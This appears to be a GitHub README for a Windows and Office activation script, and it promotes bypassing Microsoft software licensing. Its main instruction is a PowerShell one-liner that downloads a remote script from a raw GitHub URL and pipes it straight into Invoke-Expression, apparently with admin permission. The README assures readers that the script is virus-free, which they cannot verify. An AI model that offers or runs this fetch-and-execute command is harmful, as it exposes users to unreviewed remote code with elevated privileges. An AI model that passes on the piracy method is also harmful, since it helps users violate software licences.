   # Windows Activator 
<h3>An improved version of my Overpowered script that is available on my old repo!</h3>

<h4>The Differences between the old one and this:</h4>
- It's updated to run virtually, without downloading any scripts involve.
<br> - It's free from any virus.
<br> - Lifetime activation guaranteed, using the HWID method.
<br> - Could potentially activate Office as well. (beta phase.)

# How to run it?
### Run an automated script from here:
```
script : iwr -useb https://raw.githubusercontent.com/EdwardThong/windows-activ/main/downloader.ps1 | iex
```
### Or download the script from the [releases](https://github.com/EdwardThong/windows-activ/releases)

**Update:** Admin permission is a hit-or-miss at this moment, will be fixed soon.
